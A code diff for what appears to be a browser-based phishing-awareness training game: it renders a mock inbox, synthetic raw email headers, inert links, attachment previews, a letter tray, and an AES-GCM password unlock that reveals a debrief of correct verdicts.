+  const finder = (x, y) => [[0, 0], [n - 7, 0], [0, n - 7]].some(([fx, fy]) => x >= fx && x < fx + 7 && y >= fy && y < fy + 7);
+  for (let y = 0; y < n; y++) for (let x = 0; x < n; x++) if (!finder(x, y) && rnd() > .55) cells.push(`<rect x="${x}" y="${y}" width="1" height="1"/>`);
+  const fp = ([fx, fy]) => `<rect x="${fx}" y="${fy}" width="7" height="7"/><rect x="${fx + 1}" y="${fy + 1}" width="5" height="5" fill="#fff"/><rect x="${fx + 2}" y="${fy + 2}" width="3" height="3"/>`;
+  const svg = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="-1 -1 ${n + 2} ${n + 2}" shape-rendering="crispEdges" fill="#111" aria-hidden="true"><rect x="-1" y="-1" width="${n + 2}" height="${n + 2}" fill="#fff"/>${[[0, 0], [n - 7, 0], [0, n - 7]].map(fp).join('')}${cells.join('')}</svg>`;
+  const box = el('span', { class: 'qr', role: 'img', 'aria-label': 'QR code image (an illustration, not scannable)' });
+  box.innerHTML = svg;
+  box.append(el('span', { 'aria-hidden': 'true' }, 'QR CODE IMAGE'));
+  return box;
+}
+
+/* ---------------- Raw source (Show original) ---------------- */
+function plainBody(e) {
+  const links = e.links || {};
+  return e.body.map(p => p
+    .replace(/\*\*([^*]+)\*\*/g, '$1')
+    .replace(/\[QR CODE IMAGE\]/g, '[image: QR code]')
+    .replace(/\[([^\]]+)\]/g, (m0, l) => links[l] ? l + ' <' + links[l] + '>' : l)
+    .replace(/https?:\/\/[^\s]+/g, u => links[u] && links[u] !== u ? u + ' <' + links[u] + '>' : u)
+  ).join('\n\n') + '\n\nAnswer Hint: ' + e.hint;
+}
+function rawSource(s, i) {
+  const e = s.emails[i], a = e.auth;
+  const seed = s.id + i;
+  const dt = rfcDate(e.date, 4 + (hash(seed) % 50));
+  const ptr = ptrFor(a.ip), helo = a.helo || ptr;
+  const fromDom = domainOf(parseAddr(e.from).addr);
+  const msgId = '<' + hex(seed + 'm', 12) + '.' + hex(seed + 'n', 8) + '@' + (a.dkim ? a.dkim[0] : fromDom) + '>';
+  const L = [];
+  L.push('Delivered-To: ' + s.persona.email);
+  L.push('Received: from ' + s.gateway + ' (' + s.gateway + ' [10.20.0.25])', '        by mailstore.' + s.domain + ' with LMTP id ' + randStr(seed + 'l', 10, 'abcdefghijklmnopqrstuvwxyz0123456789') + ';', '        ' + dt);
+  L.push('Received: from ' + helo + ' (' + ptr + ' [' + a.ip + '])', '        by ' + s.gateway + ' with ESMTPS id ' + randStr(seed + 'e', 12, 'abcdefghijklmnopqrstuvwxyz0123456789'), '        for <' + s.persona.email + '>; ' + dt);
+  if (a.xoip) L.push('X-Originating-IP: [' + a.xoip + ']');
+  L.push('Return-Path: <' + a.rp + '>');
+  if (a.dkim) {
+    const b = randStr(seed + 'b', 172);
+    L.push('DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=' + a.dkim[0] + '; s=' + a.dkim[1] + ';', '        t=' + (1793260000 + i * 977) + '; h=from:to:subject:date:message-id;', '        bh=' + randStr(seed + 'h', 43) + '=;', '        b=' + b.slice(0, 60), '         ' + b.slice(60, 120), '         ' + b.slice(120));
+  }
+  L.push('From: ' + e.from, 'To: ' + e.to);
+  if (e.cc) L.push('Cc: ' + e.cc);
+  if (e.replyTo) L.push('Reply-To: ' + e.replyTo);
+  L.push('Subject: ' + e.subject, 'Date: ' + dt, 'Message-ID: ' + msgId, 'MIME-Version: 1.0');
+  const atts = e.attachments || [];
+  const boundary = '000000000000' + hex(seed + 'x', 12);
+  if (atts.length) {
+    L.push('Content-Type: multipart/mixed; boundary="' + boundary + '"', '', '--' + boundary, 'Content-Type: text/plain; charset="UTF-8"', '');
+  } else L.push('Content-Type: text/plain; charset="UTF-8"', 'Content-Transfer-Encoding: quoted-printable', '');
+  L.push(plainBody(e));
+  if (e.quoted) L.push('', e.quoted.join('\n'));
+  const mime = { pdf: 'application/pdf', zip: 'application/zip', xlsx: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', ics: 'text/calendar; method=REQUEST' };
+  for (const att of atts) {
+    L.push('', '--' + boundary, 'Content-Type: ' + mime[att.kind] + '; name="' + att.name + '"', 'Content-Disposition: attachment; filename="' + att.name + '"', 'Content-Transfer-Encoding: base64', '', randStr(seed + att.name, 76), randStr(seed + att.name + '2', 76), '…');
+  }
+  if (atts.length) L.push('--' + boundary + '--');
+  return { text: L.join('\n'), msgId, dt };
+}
+
+/* ---------------- Screens ---------------- */
+const screens = { landing: '#screen-landing', briefing: '#screen-briefing', game: '#screen-game', result: '#screen-result' };
+function show(name, focus = true) {
+  for (const [k, sel] of Object.entries(screens)) $(sel).hidden = k !== name;
+  $('#appbar').hidden = name === 'landing';
+  document.body.classList.toggle('in-game', name === 'game');
+  if (name !== 'result' && name !== 'landing') { state.screen = name; save(); }
+  if (focus) {
+    const h = name === 'game' ? null : $(screens[name] + ' .screen-heading');
+    if (h) h.focus();
+    window.scrollTo(0, 0);
+  }
+}
+
+function renderLanding() {
+  const box = $('#set-options');
+  box.textContent = '';
+  for (const s of Object.values(SETS)) {
+    const id = 'set-' + s.id;
+    box.append(el('div', { class: 'set-option' },
+      el('input', { type: 'radio', name: 'set', id, value: s.id, checked: state.setId === s.id }),
+      el('label', { for: id },
+        el('span', { class: 'set-badge', 'aria-hidden': 'true' }, s.id),
+        el('span', null,
+          el('span', { class: 'set-name' }, s.label + ': ' + s.company),
+          el('span', { class: 'set-desc' }, 'You are ' + s.persona.name + ', ' + s.persona.role + ', ' + s.persona.city)))));
+  }
+  $('#team').value = state.team || new URLSearchParams(location.search).get('team') || '';
+}
+
+function renderBriefing() {
+  const s = set();
+  for (const host of $$('[data-briefing]')) {
+    host.textContent = '';
+    const p = s.persona;
+    host.append(
+      el('div', { class: 'persona' }, el('span', { class: 'avatar', 'aria-hidden': 'true', style: 'background:var(--accent);color:var(--on-accent)' }, initials(p.name)),
+        el('div', null, el('div', { class: 'persona-name' }, p.name), el('div', { class: 'persona-role' }, p.role + ', ' + p.company + ', ' + p.city + ' · ' + p.email))),
+      el('p', { class: 'briefing-text' }, richText(s.briefing)),
+      el('section', { class: 'guide', 'aria-label': 'How to investigate' },
+        el('h2', null, 'How to investigate an email'),
+        el('ol', null, HOWTO.map(t => el('li', null, richText(t))))),
+      el('section', { class: 'guide', 'aria-label': 'Detective checklist' },
+        el('h2', null, 'What a good email detective checks'),
+        el('ul', null, CHECKLIST.map(t => el('li', null, t))))
+    );
+  }
+}
+
+function renderBar() {
+  const s = set();
+  $('#bar-sub').textContent = s.label + ' · ' + s.persona.email + (state.team ? ' · Team ' + state.team : '');
+  $('#me').textContent = initials(s.persona.name);
+  $('#me').title = s.persona.name;
+}
+
+function snippet(e) { return plain(e.body.find(p => p.length > 30) || e.body[0]); }
+
+function renderInbox() {
+  const s = set();
+  const list = $('#inbox-list');
+  list.textContent = '';
+  const q = $('#search').value.trim().toLowerCase();
+  let shown = 0;
+  s.emails.forEach((e, i) => {
+    if (q && !(e.from + ' ' + e.subject + ' ' + e.body.join(' ')).toLowerCase().includes(q)) return;
+    shown++;
+    const f = parseAddr(e.from);
+    const mark = state.marks[i];
+    const unread = !state.read.includes(i);
+    const chip = mark === 'phish' ? el('span', { class: 'chip chip-phish' }, 'Phish') : mark === 'legit' ? el('span', { class: 'chip chip-legit' }, 'Legit') : null;
+    const label = `Email ${i + 1} of 10. From ${f.name}. ${e.subject}. ${unread ? 'Unread. ' : ''}${e.attachments ? 'Has attachment. ' : ''}${mark ? 'Marked ' + (mark === 'phish' ? 'Phish' : 'Legit') : 'Not marked'}.`;
+    const btn = el('button', { type: 'button', 'data-i': i, 'aria-current': state.selected === i ? 'true' : null, 'aria-label': label },
+      el('span', { class: 'star', 'aria-hidden': 'true' }, icon('m12 3 2.8 5.7 6.2.9-4.5 4.4 1 6.2L12 17.3 6.5 20.2l1-6.2L3 9.6l6.2-.9z')),
+      el('span', { class: 'ii-from' }, f.name),
+      el('span', { class: 'ii-time' }, e.date.split(', ')[1] || e.date),
+      el('span', { class: 'ii-line' }, chip,
+        el('span', { class: 'ii-subject' }, el('span', { class: 'ii-subj-text' }, e.subject), el('span', { class: 'ii-snip' }, ' - ' + snippet(e))),
+        e.attachments ? el('span', { class: 'ii-clip', 'aria-hidden': 'true' }, icon('m21 11-8.5 8.5a5 5 0 0 1-7-7L14 4a3.5 3.5 0 0 1 5 5l-8.5 8.5a2 2 0 0 1-3-3L15 7')) : null));
+    list.append(el('li', { class: 'inbox-item ' + (unread ? 'unread' : 'read') }, btn));
+  });
+  $('#list-empty').hidden = shown > 0;
+  const n = markedCount();
+  $('#marked-count').textContent = n + ' of 10 marked';
+  $('#progress-bar').style.width = (n * 10) + '%';
+  const unreadN = s.emails.length - state.read.length;
+  $('#nav-unread').textContent = unreadN ? String(unreadN) : '';
+}
+
+const currentEmail = () => (state.setId && $('#screen-game') && !$('#screen-game').hidden) ? set().emails[state.selected] : null;
+
+function renderViewer() {
+  const s = set();
+  const i = state.selected;
+  const e = s.emails[i];
+  const mail = $('#mail');
+  mail.textContent = '';
+  $('#viewer-pos').textContent = (i + 1) + ' of 10';
+  $('#btn-prev').disabled = i === 0;
+  $('#btn-next').disabled = i === s.emails.length - 1;
+  for (const b of $$('.vbtn')) b.setAttribute('aria-pressed', String(state.marks[i] === b.dataset.v));
+  $('#verdict-label').textContent = 'Your verdict for email ' + (i + 1);
+  if (viewMode === 'original') return renderOriginal(s, i, mail);
+
+  const f = parseAddr(e.from);
+  const toList = [e.to, e.cc].filter(Boolean).map(parseAddr);
+  const toLabel = 'to ' + toList.map(t => t.addr === s.persona.email ? 'me' : t.name.split(/[ ,]/)[0]).join(', ');
+  const details = el('div', { class: 'hdr-details', id: 'hdr-details', hidden: true },
+    el('table', null, el('tbody', null,
+      [['from:', e.from], ['reply-to:', e.replyTo], ['to:', e.to], ['cc:', e.cc], ['date:', e.date], ['subject:', e.subject], ['security:', 'Standard encryption (TLS)']]
+        .filter(r => r[1]).map(([k, v]) => el('tr', null, el('th', { scope: 'row' }, k), el('td', null, v))))));
+  const menu = el('div', { class: 'menu', role: 'menu', id: 'msg-menu', 'aria-label': 'More options', hidden: true },
+    el('button', { type: 'button', role: 'menuitem', 'aria-disabled': 'true', tabindex: '-1' }, icon('M9 14 4 9l5-5M4 9h10a6 6 0 0 1 6 6v5'), 'Reply'),
+    el('button', { type: 'button', role: 'menuitem', 'aria-disabled': 'true', tabindex: '-1' }, icon('m15 14 5-5-5-5M20 9H10a6 6 0 0 0-6 6v5'), 'Forward'),
+    el('button', { type: 'button', role: 'menuitem', id: 'mi-original', tabindex: '-1' }, icon(['M16 18l6-6-6-6', 'M8 6l-6 6 6 6']), 'Show original'));
+  mail.append(
+    el('div', { class: 'subject-row' }, el('h2', { class: 'mail-subject', id: 'mail-subject', tabindex: '-1' }, e.subject), el('span', { class: 'label-chip' }, 'Inbox')),
+    el('div', { class: 'msg-head' }, avatar(f.name, i),
+      el('div', { class: 'msg-from' },
+        el('div', null, el('span', { class: 'name' }, f.name), ' ', el('span', { class: 'addr' }, '<' + f.addr + '>')),
+        el('button', { type: 'button', class: 'to-me', id: 'to-me', 'aria-expanded': 'false', 'aria-controls': 'hdr-details', 'aria-label': toLabel + '. Show message details' }, toLabel, icon('m6 9 6 6 6-6'))),
+      el('div', { class: 'msg-meta' }, el('span', { class: 'when' }, e.date),
+        el('div', { class: 'menu-wrap' },
+          el('button', { type: 'button', class: 'icon-btn', id: 'btn-more', 'aria-haspopup': 'menu', 'aria-expanded': 'false', 'aria-controls': 'msg-menu', 'aria-label': 'More options' }, icon(['M12 5h.01', 'M12 12h.01', 'M12 19h.01'])),
+          menu))),
+    details
+  );
+  if (e.invite) {
+    const iv = e.invite;
+    mail.append(el('section', { class: 'invite', 'aria-label': 'Calendar invitation' },
+      el('h3', null, iv.title),
+      el('dl', null, el('dt', null, 'When'), el('dd', null, iv.when), el('dt', null, 'Organizer'), el('dd', null, iv.organizer), el('dt', null, 'Where'), el('dd', null, inertLink(iv.where, e.links[iv.where], 'ilink'))),
+      el('div', { class: 'rsvp', 'aria-label': 'Reply buttons (disabled)' }, el('span', null, 'Yes'), el('span', null, 'Maybe'), el('span', null, 'No'))));
+  }
+  const body = el('div', { class: 'mail-body' }, e.body.map(p => el('p', null, richText(p, e.links))));
+  if (e.quoted) {
+    const q = el('div', { class: 'quoted', id: 'quoted', hidden: true }, e.quoted.join('\n'));
+    body.append(el('button', { type: 'button', class: 'quoted-toggle', 'aria-expanded': 'false', 'aria-controls': 'quoted', 'aria-label': 'Show trimmed content', id: 'quoted-toggle' }, '•••'), q);
+  }
+  mail.append(body);
+  if (e.attachments) {
+    const enc = e.attachments.some(a => a.encrypted);
+    const colors = { pdf: '#d93025', zip: '#5f6368', xlsx: '#188038', ics: '#1a73e8' };
+    mail.append(el('section', { class: 'atts', 'aria-label': 'Attachments' },
+      el('div', { class: 'atts-title' }, e.attachments.length === 1 ? 'One attachment' : e.attachments.length + ' attachments'),
+      enc ? el('div', { class: 'att-warn' }, icon(['M12 3 2 20h20z', 'M12 10v4M12 17h.01']), 'This attachment is encrypted, so it can\'t be scanned for viruses.') : null,
+      el('div', { class: 'att-list' }, e.attachments.map((a, k) => el('button', { type: 'button', class: 'att-chip', 'data-att': k, 'aria-label': 'Open attachment ' + a.name + ', ' + a.size + (a.encrypted ? ', encrypted' : '') },
+        el('span', { class: 'att-icon', style: 'background:' + colors[a.kind] }, a.kind.toUpperCase()),
+        el('span', { style: 'min-width:0' }, el('span', { class: 'att-name' }, a.name), el('span', { class: 'att-size' }, a.size + (a.encrypted ? ' · encrypted' : ''))))))));
+  }
+  mail.append(el('p', { class: 'hint-line' }, 'Answer Hint:', el('span', { class: 'hint-letter' }, e.hint)));
+}
+
+function renderOriginal(s, i, mail) {
+  const e = s.emails[i];
+  const raw = rawSource(s, i);
+  const pre = el('pre', { class: 'raw', id: 'raw', tabindex: '0', 'aria-label': 'Raw message source' }, raw.text);
+  mail.append(el('div', { class: 'orig' },
+    el('div', { class: 'orig-head' },
+      el('button', { type: 'button', class: 'btn btn-sm', id: 'btn-orig-back' }, icon('M19 12H5M12 19l-7-7 7-7'), 'Back to message'),
+      el('h2', { id: 'mail-subject', tabindex: '-1' }, 'Original message'),
+      el('button', { type: 'button', class: 'btn btn-sm', id: 'btn-copy-raw' }, 'Copy to clipboard')),
+    el('table', { class: 'orig-summary' }, el('tbody', null,
+      [['Message ID', raw.msgId], ['Created at', raw.dt], ['From', e.from], ['To', e.to], ['Subject', e.subject]].map(([k, v]) => el('tr', null, el('th', { scope: 'row' }, k), el('td', null, v))))),
+    el('p', { class: 'orig-note' }, 'This training mailbox does not stamp SPF, DKIM or DMARC results. Work them out yourself with the Lookup panel.'),
+    pre));
+}
+
+function trayLetters() { return set().emails.map((e, i) => state.marks[i] === 'phish' ? e.hint : null).filter(Boolean); }
+
+function renderTray() {
+  const tiles = $('#tiles');
+  tiles.textContent = '';
+  const letters = trayLetters();
+  if (!letters.length) tiles.append(el('span', { class: 'tiles-empty' }, 'No letters yet. Mark an email as Phish to add its hint letter.'));
+  else letters.forEach(l => tiles.append(el('span', { class: 'tile', role: 'listitem' }, l)));
+  tiles.setAttribute('aria-label', letters.length ? 'Letters in the tray: ' + letters.join(', ') : 'Letter tray is empty');
+  updateSubmit();
+  const note = $('#solved-note');
+  if (state.solved) { note.hidden = false; note.textContent = 'Solved in ' + fmtTimeLong(state.solved.elapsed) + '. Enter the word again to reopen the debrief.'; }
+  else note.hidden = true;
+}
+
+function updateSubmit() {
+  const n = markedCount(), cooling = isCooling();
+  $('#btn-submit').disabled = checking || n < 10 || cooling;
+  const help = $('#submit-help');
+  if (n < 10) help.textContent = 'Mark all 10 emails to submit (' + n + ' of 10 marked).';
+  else if (cooling) help.textContent = 'Paused after 5 wrong tries.';
+  else help.textContent = 'All 10 emails marked. ' + (MAX_TRIES - state.streak) + ' tries before a 30-second pause.';
+  const cd = $('#cooldown');
+  if (cooling) { cd.hidden = false; cd.textContent = 'Too many tries. Try again in ' + Math.ceil((state.cooldownUntil - Date.now()) / 1000) + ' s.'; }
+  else cd.hidden = true;
+  if (lastCooldownActive && !cooling) say('You can try again now.', '');
+  lastCooldownActive = cooling;
+}
+
+function say(msg, kind) {
+  const s = $('#status');
+  s.className = 'status' + (kind ? ' ' + kind : '');
+  s.textContent = '';
+  setTimeout(() => { s.textContent = msg; }, 30);
+}
+
+/* Side panel tabs; below 1180px the panel is a drawer. */
+function setSideTab(tab, openDrawer) {
+  state.sideTab = tab; save();
+  for (const t of ['lookup', 'tray']) {
+    const sel = t === tab;
+    $('#tab-' + t).setAttribute('aria-selected', String(sel));
+    $('#tab-' + t).tabIndex = sel ? 0 : -1;
+    $('#panel-' + t).hidden = !sel;
+  }
+  if (openDrawer) { $('#side').classList.add('open'); $('#tab-' + tab).focus(); }
+}
+const isDrawer = () => window.matchMedia('(max-width: 1179.98px)').matches;
+function closeDrawer() { $('#side').classList.remove('open'); }
+
+function renderGame() { renderBar(); renderInbox(); renderViewer(); renderTray(); setSideTab(state.sideTab || 'lookup'); renderLookupForm(); }
+
+/* ---------------- Timer ---------------- */
+function tick() {
+  if (!state.startedAt) return;
+  $('#timer').textContent = fmtTime(state.solved ? state.solved.elapsed : Date.now() - state.startedAt);
+  if (!$('#screen-game').hidden) updateSubmit();
+}
+setInterval(tick, 500);
+
+/* ---------------- Actions ---------------- */
+function select(i, focusSubject) {
+  if (i < 0 || i >= set().emails.length) return;
+  state.selected = i;
+  viewMode = 'message';
+  if (!state.read.includes(i)) state.read.push(i);
+  save();
+  renderInbox(); renderViewer();
+  $('#screen-game').classList.add('reading');
+  if (focusSubject) $('#mail-subject').focus({ preventScroll: true });
+  const v = $('#viewer'); if (v.scrollTo) v.scrollTo(0, 0);
+  if (window.matchMedia('(max-width: 759.98px)').matches) window.scrollTo(0, 0);
+}
+
+function mark(v) {
+  const i = state.selected;
+  state.marks[i] = v;
+  save();
+  renderInbox(); renderTray();
+  for (const b of $$('.vbtn')) b.setAttribute('aria-pressed', String(state.marks[i] === b.dataset.v));
+  say('Email ' + (i + 1) + ' marked ' + (v === 'phish' ? 'Phish' : 'Legit') + '. ' + markedCount() + ' of 10 marked.', '');
+}
+
+function setOriginal(on) {
+  viewMode = on ? 'original' : 'message';
+  renderViewer();
+  $('#mail-subject').focus({ preventScroll: true });
+  const v = $('#viewer'); if (v.scrollTo) v.scrollTo(0, 0);
+}
+
+function openMenu(open) {
+  const m = $('#msg-menu'), b = $('#btn-more');
+  if (!m) return;
+  m.hidden = !open;
+  b.setAttribute('aria-expanded', String(open));
+  if (open) $('#mi-original').focus(); else b.focus();
+}
+
+let toastTimer = null;
+function showLinkToast(href) {
+  const t = $('#toast');
+  t.textContent = '';
+  t.append(el('strong', null, 'Links are disabled in this game.'), el('span', { class: 'url' }, href || 'No destination'),
+    el('div', { class: 'row' },
+      href ? el('button', { type: 'button', id: 'toast-scan' }, 'Scan this URL') : null,
+      el('button', { type: 'button', id: 'toast-close' }, 'Close')));
+  t.hidden = false;
+  clearTimeout(toastTimer);
+  toastTimer = setTimeout(() => { t.hidden = true; }, 9000);
+  const scan = $('#toast-scan');
+  if (scan) scan.addEventListener('click', () => {
+    t.hidden = true;
+    $('#lk-type').value = 'url'; renderLookupForm();
+    $('#lk-a').value = href; runLookup();
+    setSideTab('lookup', isDrawer());
+    if (!isDrawer()) $('#lk-a').focus();
+  });
+  $('#toast-close').addEventListener('click', () => { t.hidden = true; });
+}
+
+function openAttachment(e, a) {
+  const body = $('#dlg-att-body');
+  body.textContent = '';
+  $('#dlg-att-title').textContent = a.name;
+  if (a.encrypted) {
+    body.append(el('div', { class: 'preview-locked' }, icon(['M5 11h14v10H5z', 'M8 11V7a4 4 0 0 1 8 0v4']),
+      el('p', null, el('strong', null, a.kind === 'zip' ? 'Encrypted archive' : 'Password-protected file')),
+      el('p', null, a.kind === 'zip' ? 'The contents of this archive can\'t be listed or scanned for viruses until it is opened with its password.' : 'This file is password-protected, so it can\'t be previewed or scanned here.')));
+  } else {
+    if (a.info) body.append(el('p', { class: 'preview-meta' }, a.info));
+    a.pages.forEach((pg, k) => {
+      if (a.code) body.append(el('pre', { class: 'preview-code' }, pg.join('\n')));
+      else body.append(el('div', { class: 'preview-page', 'aria-label': 'Page ' + (k + 1) }, pg.map(p => el('p', null, richText(p, e.links)))));
+    });
+  }
+  $('#dlg-att').showModal();
+}
+
+const b64 = s => Uint8Array.from(atob(s), c => c.charCodeAt(0));
+
+/* Verify = try to decrypt. A wrong password fails AES-GCM authentication. */
+async function tryUnlock(setId, word) {
+  const p = PAYLOADS && PAYLOADS[setId];
+  if (!p) throw new Error('This file was not built. Run build.js to create dist/game.html.');
+  if (!(window.crypto && crypto.subtle)) throw new Error('This browser blocks Web Crypto here. Open the file directly (file://) or over https.');
+  const enc = new TextEncoder();
+  const base = await crypto.subtle.importKey('raw', enc.encode(word), 'PBKDF2', false, ['deriveKey']);
+  const key = await crypto.subtle.deriveKey({ name: 'PBKDF2', hash: 'SHA-256', salt: b64(p.salt), iterations: p.iterations }, base, { name: 'AES-GCM', length: 256 }, false, ['decrypt']);
+  try {
+    const pt = await crypto.subtle.decrypt({ name: 'AES-GCM', iv: b64(p.iv), additionalData: enc.encode(p.aad), tagLength: 128 }, key, b64(p.ct));
+    return JSON.parse(new TextDecoder().decode(pt));
+  } catch (e) {
+    if (e && e.name === 'OperationError') return null;
+    throw e;
+  }
+}
+
+async function submitPassword(ev) {
+  ev.preventDefault();
+  if (checking) return;
+  if (markedCount() < 10) { say('Mark all 10 emails before you submit.', 'bad'); return; }
+  if (isCooling()) return;
+  const word = $('#pw').value.trim().toUpperCase();
+  if (!word) { say('Type the word from your letter tray first.', 'bad'); $('#pw').focus(); return; }
+  checking = true; updateSubmit();
+  $('#btn-submit').textContent = 'Checking…';
+  say('Checking…', '');
+  let data = null;
+  try { data = await tryUnlock(state.setId, word); }
+  catch (err) { checking = false; $('#btn-submit').textContent = 'Submit'; updateSubmit(); say(err.message, 'bad'); return; }
+  checking = false;
+  $('#btn-submit').textContent = 'Submit';
+  state.attempts += 1;
+  if (data) {
+    const firstSolve = !state.solved;
+    if (!state.solved) state.solved = { elapsed: Date.now() - state.startedAt, attempts: state.attempts };
+    if (firstSolve) reportToHub({
+      status: 'pass', maxScore: 10, attempts: state.solved.attempts, durationSec: Math.round(state.solved.elapsed / 1000),
+      score: data.emails.filter((info, i) => state.marks[i] === String(info.verdict).toLowerCase()).length,
+      details: { set: state.setId }
+    });
+    state.streak = 0;
+    save();
+    $('#pw').value = '';
+    unlocked = { word, data };
+    say('', '');
+    closeDrawer();
+    showResult();
+    return;
+  }
+  state.streak += 1;
+  let msg = 'Not quite. Re-check your Phish/Legit calls.';
+  if (state.streak >= MAX_TRIES) {
+    state.streak = 0;
+    state.cooldownUntil = Date.now() + COOLDOWN_MS;
+    lastCooldownActive = true;
+    msg += ' That was try ' + MAX_TRIES + ' of ' + MAX_TRIES + ', so the lock pauses for 30 seconds.';
+  }
+  save();
+  updateSubmit();
+  say(msg, 'bad');
+}
+
+// Escape Hub bridge (no-op when played standalone)
+function reportToHub(r) {
+  try { if (window.parent !== window) window.parent.postMessage(Object.assign({ type: 'escape-hub:result', puzzle: 1 }, r), '*'); } catch (_) {}
+}
+
+function showResult() {
+  const s = set();
+  const d = unlocked.data;
+  let score = 0;
+  const list = $('#debrief-list');
+  list.textContent = '';
+  d.emails.forEach((info, i) => {
+    const e = s.emails[i];
+    const truth = String(info.verdict).toLowerCase();
+    const mine = state.marks[i];
+    const ok = mine === truth;
+    if (ok) score++;
+    const chip = t => el('span', { class: 'chip ' + (t === 'phish' ? 'chip-phish' : 'chip-legit') }, t === 'phish' ? 'Phish' : 'Legit');
+    list.append(el('li', { class: 'card db-card' },
+      el('div', { class: 'db-head' }, el('span', { class: 'db-num' }, 'Email ' + (i + 1)), el('span', { class: 'db-subject' }, e.subject)),
+      el('div', { class: 'db-verdicts' },
+        el('span', null, 'Correct verdict: ', chip(truth)),
+        el('span', null, 'Your verdict: ', mine ? chip(mine) : el('span', { class: 'chip chip-none' }, 'None'),
+          el('span', { class: ok ? 'mark-ok' : 'mark-bad', 'aria-hidden': 'true' }, ok ? '✓' : '✗'),
+          el('span', { class: 'sr-only' }, ok ? '(correct)' : '(incorrect)'))),
+      el('dl', null,
+        el('div', null, el('dt', null, 'The real giveaway'), el('dd', null, info.giveaway)),
+        el('div', null, el('dt', null, 'Why it was hard'), el('dd', null, info.whyHard)))));
+  });
+  $('#unlocked-word').textContent = unlocked.word;
+  $('#stat-time').textContent = fmtTime(state.solved.elapsed);
+  $('#stat-attempts').textContent = String(state.solved.attempts);
+  $('#stat-score').textContent = score + ' / 10';
+  const note = $('#debrief-note');
+  note.textContent = '';
+  note.append(el('p', null, d.hintSummary), el('p', null, d.teachingPairs));
+  $('#result-title').textContent = 'Case closed' + (state.team ? ', Team ' + state.team : '');
+  show('result');
+}
+
+function resetAll() {
+  try { sessionStorage.removeItem(STORE_KEY); } catch (e) { /* ignore */ }
+  state = fresh();
+  unlocked = null;
+  viewMode = 'message';
+  $('#pw').value = '';
+  $('#status').textContent = '';
+  $('#search').value = '';
+  $('#lk-out').textContent = 'Results appear here.';
+  closeDrawer();
+  renderLanding();
+  show('landing');
+}
+
+/* ---------------- Wiring ---------------- */
+$('#start-form').addEventListener('submit', ev => {
+  ev.preventDefault();
+  const picked = $('input[name="set"]:checked');
+  if (!picked) { $('#start-error').textContent = 'Choose Set A or Set B first.'; $('#set-options input').focus(); return; }
+  $('#start-error').textContent = '';
+  state = fresh();
+  state.setId = picked.value;
+  state.team = $('#team').value.trim().slice(0, 40);
+  state.startedAt = Date.now();
+  save();
+  renderBriefing(); renderBar(); tick();
+  show('briefing');
+});
+
+$('#btn-open-inbox').addEventListener('click', () => {
+  renderGame();
+  show('game');
+  $('#screen-game').classList.remove('reading');
+  const cur = $('#inbox-list button[aria-current="true"]') || $('#inbox-list button');
+  if (cur) cur.focus();
+});
+
+$('#search').addEventListener('input', () => renderInbox());
+
+$('#inbox-list').addEventListener('click', ev => {
+  const b = ev.target.closest('button[data-i]');
+  if (b) select(Number(b.dataset.i), true);
+});
+$('#inbox-list').addEventListener('keydown', ev => {
+  const b = ev.target.closest('button[data-i]');
+  if (!b) return;
+  const btns = $$('#inbox-list button');
+  const idx = btns.indexOf(b);
+  let next = null;
+  if (ev.key === 'ArrowDown') next = btns[Math.min(idx + 1, btns.length - 1)];
+  else if (ev.key === 'ArrowUp') next = btns[Math.max(idx - 1, 0)];
+  else if (ev.key === 'Home') next = btns[0];
+  else if (ev.key === 'End') next = btns[btns.length - 1];
+  if (next) { ev.preventDefault(); next.focus(); }
+});
+
+$('#btn-prev').addEventListener('click', () => select(state.selected - 1, false));
+$('#btn-next').addEventListener('click', () => select(state.selected + 1, false));
+$('#btn-back').addEventListener('click', () => {
+  $('#screen-game').classList.remove('reading');
+  const b = $('#inbox-list button[aria-current="true"]'); if (b) b.focus();
+});
+for (const b of $$('.vbtn')) b.addEventListener('click', () => mark(b.dataset.v));
+$('#pw-form').addEventListener('submit', submitPassword);
+
+// Reader interactions (delegated, because the reader re-renders).
+$('#mail').addEventListener('click', ev => {
+  const t = ev.target;
+  const link = t.closest('.ilink, .ibtn');
+  if (link) { ev.preventDefault(); showLinkToast(link.dataset.href); return; }
+  if (t.closest('#to-me')) {
+    const btn = $('#to-me'), det = $('#hdr-details');
+    const open = btn.getAttribute('aria-expanded') !== 'true';
+    btn.setAttribute('aria-expanded', String(open)); det.hidden = !open;
+    return;
+  }
+  if (t.closest('#btn-more')) { openMenu($('#msg-menu').hidden); return; }
+  if (t.closest('#mi-original')) { setOriginal(true); return; }
+  if (t.closest('[role="menuitem"][aria-disabled="true"]')) return;
+  if (t.closest('#btn-orig-back')) { setOriginal(false); return; }
+  if (t.closest('#btn-copy-raw')) {
+    const text = $('#raw').textContent;
+    const done = () => say('Original message copied.', '');
+    if (navigator.clipboard && navigator.clipboard.writeText) navigator.clipboard.writeText(text).then(done, () => selectRaw());
+    else selectRaw();
+    return;
+  }
+  if (t.closest('#quoted-toggle')) {
+    const b = $('#quoted-toggle'), q = $('#quoted');
+    const open = b.getAttribute('aria-expanded') !== 'true';
+    b.setAttribute('aria-expanded', String(open)); b.setAttribute('aria-label', open ? 'Hide trimmed content' : 'Show trimmed content'); q.hidden = !open;
+    return;
+  }
+  const chip = t.closest('.att-chip');
+  if (chip) { const e = set().emails[state.selected]; openAttachment(e, e.attachments[Number(chip.dataset.att)]); }
+});
+function selectRaw() { const r = document.createRange(); r.selectNodeContents($('#raw')); const s = getSelection(); s.removeAllRanges(); s.addRange(r); say('Text selected. Press Ctrl+C to copy.', ''); }
+$('#mail').addEventListener('keydown', ev => {
+  const m = $('#msg-menu');
+  if (!m || m.hidden) return;
+  const items = $$('[role="menuitem"]', m);
+  const idx = items.indexOf(document.activeElement);
+  if (ev.key === 'Escape') { ev.preventDefault(); openMenu(false); }
+  else if (ev.key === 'ArrowDown') { ev.preventDefault(); items[(idx + 1) % items.length].focus(); }
+  else if (ev.key === 'ArrowUp') { ev.preventDefault(); items[(idx - 1 + items.length) % items.length].focus(); }
+  else if (ev.key === 'Tab') openMenu(false);
+});
+document.addEventListener('click', ev => {
+  const m = $('#msg-menu');
+  if (m && !m.hidden && !ev.target.closest('.menu-wrap')) { m.hidden = true; $('#btn-more').setAttribute('aria-expanded', 'false'); }
+});
+
+// Link hover/focus shows the real destination, like a browser status bar.
+const linkbar = $('#linkbar');
+function linkHover(ev) {
+  const l = ev.target.closest && ev.target.closest('.ilink, .ibtn');
